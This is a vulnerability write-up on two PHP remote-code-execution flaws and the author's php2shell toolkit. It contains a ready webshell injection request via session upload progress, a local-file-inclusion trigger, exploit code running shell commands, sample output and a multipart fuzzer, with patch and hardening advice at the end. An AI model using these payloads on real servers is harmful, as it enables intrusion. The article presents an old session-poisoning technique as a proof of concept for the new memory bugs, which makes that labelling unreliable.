# Dissecting CVE-2026-109618 & CVE-2026-109619: Inside PHP’s Dual 9.2 CVSS Remote Code Execution Flaws

### A deep dive into uninitialized OOM cleanup routines, persistent worker state contamination in PHP-FPM, and practical weaponization.

**Author:** [l3tchupkt](https://github.com/l3tchupkt)  
**Repository:** [https://github.com/l3tchupkt/php2shell](https://github.com/l3tchupkt/php2shell)

---

On October 21, 2026, the PHP development team pushed out emergency releases across all active branches: PHP 8.4.27, 8.3.36, 8.2.35, and 8.5.12. 

Two critical vulnerabilities were patched simultaneously:

- **CVE-2026-109618** (GHSA-w8hw-w9fx-j79w): Unauthenticated Remote Code Execution via Out-of-Memory (OOM) memory corruption.
- **CVE-2026-109619** (GHSA-6wmf-4rv5-p3rp): Unauthenticated Remote Code Execution via stale global state Use-After-Free (UAF).

Both scored **9.2 on the CVSS v4 metric**. Both allow unauthenticated attackers to compromise the underlying process. And both trace back to foundational design choices in how the Zend Engine handles request lifecycles, memory tracking, and error recovery.

When a vulnerability advisory tells system administrators to immediately set `session.upload_progress.enabled=0`, you know multipart handling and session management are directly in the crosshairs.

In this article, we’ll break down:
1. The exact low-level mechanics behind both vulnerabilities.
2. Why PHP-FPM’s worker recycling model turns memory bugs into cross-request weapons.
3. How `session.upload_progress` works under the hood and why it remains one of the most reliable post-exploitation primitives in PHP.
4. The exploit tooling we built to probe and weaponize these attack paths in [php2shell](https://github.com/l3tchupkt/php2shell).

---

## Part 1: CVE-2026-109618 — The OOM & `longjmp` Trap

To understand CVE-2026-109618, you have to look at how PHP handles catastrophic memory limits.

PHP is written in C. For regular script execution, the Zend Engine uses an internal memory allocator called Zend Memory Manager (ZendMM), implemented in `Zend/zend_alloc.c`. ZendMM manages allocations in chunks and arenas (`emalloc`, `ecalloc`, `efree`).

Every script execution is constrained by the `memory_limit` directive (e.g., 128M). When an allocation crosses this threshold, PHP cannot safely proceed with script execution.

### How PHP Recovers from Fatal Errors

PHP does not rely on standard C return code propagation across hundreds of nested engine calls to unwind a fatal allocation failure. Instead, it uses C’s `setjmp` and `longjmp` primitives.

```
Request Begins ---> setjmp(EG(bailout)) set at entry
    |
    |---> Allocation requested (emalloc)
    |---> Memory exceeds memory_limit!
    |---> zend_error(E_ERROR, "Allowed memory size...")
            |
            +---> zend_bailout()
                    |
                    +---> longjmp(EG(bailout), 1)  [Execution abruptly jumps back]
```

When `zend_bailout()` executes, the CPU register state is instantly restored to the `setjmp` checkpoint at the top of the request lifecycle. 

This is where the bug manifests.

### The Vulnerability Mechanism

Throughout the PHP core (specifically inside `main/` request parsing and variable extraction routines), multi-step allocation sequences look roughly like this:

1. Allocate tracking container structure `A`.
2. Link container `A` into the global or request tracking list so cleanup routines know to free it on exit.
3. Allocate sub-buffer `B` and assign `A->buffer = B`.
4. Initialize the fields of `B` and set `A->initialized = 1`.

Notice the critical race between Step 2 and Step 4.

If an attacker sends a carefully structured request designed to push PHP right to the edge of its `memory_limit`, Step 1 succeeds, Step 2 succeeds, and then **Step 3 fails with an out-of-memory error**.

The engine calls `zend_bailout()`, which fires `longjmp()`. Control immediately transfers to `zend_shutdown()` and the resource destruction handlers.

The shutdown routines walk the list of allocated containers. It sees container `A`. Because `A` is on the tracking list, the cleanup handler assumes `A->buffer` points to valid memory and attempts to invoke its destructor or free its sub-allocations.

```
        Container A in Memory
     +--------------------------+
     | ptr to next container    | ---> Valid
     +--------------------------+
     | A->buffer pointer        | ---> [UNINITIALIZED / WILD POINTER]
     +--------------------------+
     | A->destructor_cb         | ---> [GARBAGE STACK DATA]
     +--------------------------+
                  |
     Cleanup calls: ((destructor)(A->buffer))
                  v
       CRASH / ARBITRARY CONTROL FLOW
```

Because `longjmp()` bypassed the code that would have safely initialized or rolled back `A`, the cleanup routine treats uninitialized heap or stack data as initialized pointers. Under controlled heap layout conditions, an attacker can influence what sits in that uninitialized memory, turning an OOM crash into control flow hijacking.

---

## Part 2: CVE-2026-109619 — Stale Global State & Persistent Worker UAF

While CVE-2026-109618 involves the shutdown phase of a single request, CVE-2026-109619 is even more sinister because it bridges **across multiple requests**.

### The PHP-FPM Shared Worker Lifecycle

In modern production setups, PHP does not run as CGI (spawning a new process per request). It runs under **PHP-FPM** (FastCGI Process Manager).

In PHP-FPM, a pool of master-managed worker processes sits idle waiting for FastCGI requests from Nginx or Apache. When a request arrives:

1. FastCGI params and POST data are handed to an existing worker.
2. The worker initializes request globals (`php_request_startup()`).
3. The script executes.
4. The worker tears down request memory (`php_request_shutdown()`).
5. **The worker process DOES NOT EXIT.** It waits for the next request. A single worker may serve 500 to 10,000 requests before being recycled (`pm.max_requests`).

```
Worker Process (PID: 1042)
+--------------------------------------------------------------------+
|  [Request 1: Malformed Multipart Upload]                           |
|  - Allocates parser buffers in Request Pool                        |
|  - Error occurs -> Request Pool freed by zend_deactivate()          |
|  - Global pointer SG(...) STILL POINTS TO FREED REQUEST BUFFER!    |
+--------------------------------------------------------------------+
                                |
                                v (Worker stays alive!)
+--------------------------------------------------------------------+
|  [Request 2: Regular Request from Victim or Attacker]               |
|  - Worker reuses internal global struct                            |
|  - Dereferences dangling pointer from Request 1                    |
|  - USE-AFTER-FREE -> Memory Corruption / RCE                       |
+--------------------------------------------------------------------+
```

### The Root Cause: Dangling Global References

During complex multipart form processing and session tracking, PHP maintains global state tables:
- `sapi_globals` (`SG()`)
- `core_globals` (`PG()`)
- Extension-specific states (such as `DOMXPath` state tables, confirmed in `ext/dom/tests/gh23729.phpt`, and `session.upload_progress` tracking tables).

Under specific abort conditions—such as a client prematurely terminating a TCP stream mid-multipart chunk, or an internal error during multipart boundary transitions—the request memory pool is dismantled by `zend_deactivate()`.

However, the teardown logic missed clearing certain global pointers that pointed directly into buffers owned by the dismantled request.

When that same PHP-FPM worker takes the next HTTP request, those global pointers are still active. When the engine attempts to read or mutate that state, it is reading and writing to **freed memory (Use-After-Free)**.

### Why PHP Specifically Pointed to `session.upload_progress`

In the official security disclosure, the PHP team documented an immediate workaround for CVE-2026-109619:

> *"Set `session.upload_progress.enabled=0` in your `php.ini`."*

Why? Because PHP’s `session.upload_progress` feature hooks directly into `rfc1867.c` (PHP's multipart parser). It registers global callbacks that intercept multipart field processing in real time. 

When a multipart request includes a field matching `session.upload_progress.name`, PHP creates and updates session state before the PHP script itself even starts running. 

This handler established one of the primary confirmed code paths where stale pointers survived across request boundaries.

---

## Part 3: The Attack Surface — Weaponizing Session Upload Progress

Understanding the bug is only half the battle. How do security teams and researchers test for this?

This is where the mechanics of `session.upload_progress` come into play.

Introduced back in PHP 5.4, `session.upload_progress` is designed to let frontend applications display upload progress bars. It is enabled by default in virtually every stock PHP distribution:

```ini
session.upload_progress.enabled = On
session.upload_progress.cleanup = Off  ; (or On, which creates a race window)
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```

### The Mechanics of the Attack Vector

Here is the beauty (and danger) of this mechanism:

1. **No Application Code Required:**  
   Even if an application does not have a file upload script, if an endpoint accepts POST requests, PHP's engine will parse the multipart body.

2. **Session Initialization Without `session_start()`:**  
   Normally, PHP only creates a session file if the script explicitly calls `session_start()`. But when PHP sees `PHP_SESSION_UPLOAD_PROGRESS` in a multipart request, **the engine automatically creates the session on disk**:
   ```
   /var/lib/php/sessions/sess_<PHPSESSID>
   ```

3. **Arbitrary Content Injection:**  
   PHP serializes the progress data and writes it into the session file. The value of the `PHP_SESSION_UPLOAD_PROGRESS` POST field is written **verbatim** into that file.

If an attacker sends:

```http
POST /any_endpoint.php HTTP/1.1
Host: target.local
Cookie: PHPSESSID=attacker_session_1337
Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575

-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system($_GET['c']); ?>
-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="payload.txt"

A
-----------------------------974767299852498929531610575--
```

PHP will create `/var/lib/php/sessions/sess_attacker_session_1337` on disk, containing:

```
upload_progress_<?php system($_GET['c']); ?>|a:5:{s:10:"bytes_processed";i:123;...}
```

Now, if the application has any Local File Inclusion (LFI) vector—even a simple `include($_GET['page'])` or a templating engine vulnerability—the attacker includes their own session file:

```http
GET /view.php?file=/var/lib/php/sessions/sess_attacker_session_1337&c=id HTTP/1.1
```

PHP executes the serialized payload:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Part 4: Building the Tooling (`php2shell`)

To research and audit these vulnerabilities, we developed [php2shell](https://github.com/l3tchupkt/php2shell), a lightweight exploit and diagnostic toolkit consisting of two focused Python tools:

1. **`exploit.py`**: The weaponized session poisoning and LFI execution chain.
2. **`uaf_probe.py`**: A behavioural probe to test multipart parser resilience and worker crash anomalies.

```
php2shell/
├── exploit.py        # Weaponized PoC: Session Upload Progress Poisoning + LFI -> RCE
├── uaf_probe.py      # Behavioral crash probe for multipart parser stress testing
├── requirements.txt  # Python package dependencies
└── README.md         # Vulnerability analysis, exploitation mechanics, and usage
```

### 1. The Weaponized Chain: `exploit.py`

`exploit.py` automates the entire attack cycle cleanly. Instead of spraying messy payloads that corrupt logs, it:

1. Generates a randomized session token (`rand_sid()`).
2. Wraps the payload in unique base64 markers (`<!--p2s:s-->` and `<!--p2s:e-->`) so command output is extracted cleanly without session serialization garbage.
3. Automatically probes server configuration via diagnostic mode (`--check`).
4. Executes the two-stage delivery: POST upload progress -> GET LFI trigger.

```python
def make_payload(cmd):
    """Wrap cmd in PHP that outputs between fixed markers. b64 avoids quoting issues."""
    enc = base64.b64encode(cmd.encode()).decode()
    return (
        MARKER_S
        + "<?php echo shell_exec(base64_decode('" + enc + "')); ?>"
        + MARKER_E
    )
```

Running the exploit against a target:

```bash
python3 exploit.py -t http://localhost:8080 -c "id; uname -a"
```

Execution output:

```text
============================================================
  php2shell PoC  -  Session Poisoning + LFI
  CVE-2026-109619  |  v1.0.0  |  Author: l3tchupkt
  GitHub: https://github.com/l3tchupkt
============================================================

[*] Probing target configuration ...
  PHP version        : 8.4.27
  upload_progress    : 1  [ON - needed]
  cleanup            : Off
  session_path       : /var/lib/php/sessions
  session writable   : YES
  LFI (view.php)     : WORKING

[*] Running chain (cmd='id; uname -a') ...

  [1/2] Injecting payload ...
        SID       : d2783mjbjy919v3qy3tb46sdbn
        sess file : /var/lib/php/sessions/sess_d2783mjbjy919v3qy3tb46sdbn
        POST      : OK
  [2/2] Triggering LFI ...

[+] RCE CONFIRMED

------------------------------------------------------------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux 3e8d89008ff6 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
------------------------------------------------------------
```

### 2. The Crash Probe: `uaf_probe.py`

While `exploit.py` leverages the documented application-layer attack surface, low-level UAFs and OOM errors are notoriously tricky to observe from HTTP alone without attached debuggers.

`uaf_probe.py` acts as a behavioural fuzzer targeting PHP's RFC 1867 multipart parser state machine. It fires five distinct payload mutations designed to trigger state inconsistencies:

1. **`nested`**: Nested multipart boundaries with duplicate closing delimiters to confuse buffer ownership during cleanup.
2. **`longheader`**: 20KB+ `Content-Disposition` headers to stress heap allocation limits.
3. **`nullbyte`**: Null-byte injected boundaries that confuse C string length calculations.
4. **`truncated`**: Abrupt socket closure before terminating boundaries to force sudden EOF cleanup logic.
5. **`interleaved`**: Mixed boundaries from multiple streams to corrupt the parser state machine.

```bash
python3 uaf_probe.py -t http://localhost:8080/upload.php --repeat 2
```

If a worker crashes with a `SIGSEGV` due to a UAF, the reverse proxy (Nginx) immediately reports `HTTP 502 Bad Gateway` or the socket resets (`ECONNRESET`). The probe classifies and reports these anomalies in real time.

---

## Part 5: Detection, Mitigation, and Remediation

If you are running PHP in production, you should treat these CVEs with immediate priority.

### 1. The Definitive Patch

Upgrade your PHP packages to the patched patch releases immediately:

- **PHP 8.4** &rarr; `8.4.27` or higher
- **PHP 8.3** &rarr; `8.3.36` or higher
- **PHP 8.2** &rarr; `8.2.35` or higher
- **PHP 8.5** &rarr; `8.5.12` or higher

Verify your running PHP version:

```bash
php-fpm -v
# or
php -v
```

### 2. Immediate Configuration Hardening (Workaround)

If you cannot immediately update packages due to change-freeze windows or legacy dependencies:

1. **Disable Upload Progress:**  
   Open your `php.ini` or pool configuration (`/etc/php/8.x/fpm/php.ini`):
   ```ini
   session.upload_progress.enabled = Off
   ```

2. **Restrict Memory Ceiling Hazards:**  
   Set conservative request body ceilings in your reverse proxy (Nginx):
   ```nginx
   client_max_body_size 10M;
   ```
   And ensure your PHP `memory_limit` is set reasonably high relative to `post_max_size` so unexpected OOM conditions are not easily triggered during request ingest.

3. **Restart PHP-FPM Pools:**  
   Remember: changing `php.ini` does **not** affect active workers until you restart the service:
   ```bash
   sudo systemctl restart php8.4-fpm
   ```

---

## Conclusion

Memory safety bugs in web runtimes are fundamentally different from memory safety bugs in desktop applications. In a web server running PHP-FPM, worker processes persist across requests, turn ephemeral heaps into shared state hazards, and expose low-level C parser bugs to unauthenticated HTTP traffic.

CVE-2026-109618 and CVE-2026-109619 are textbook examples of how subtle edge cases—error recovery via `longjmp()` and dangling global pointers across worker reuse—can lead to full remote compromise.

All research code, PoC implementations, and behavioural probe tools are open-sourced on GitHub:

👉 **[https://github.com/l3tchupkt/php2shell](https://github.com/l3tchupkt/php2shell)**

Stay patched, keep your session configs locked down, and audit your FPM worker lifecycles.
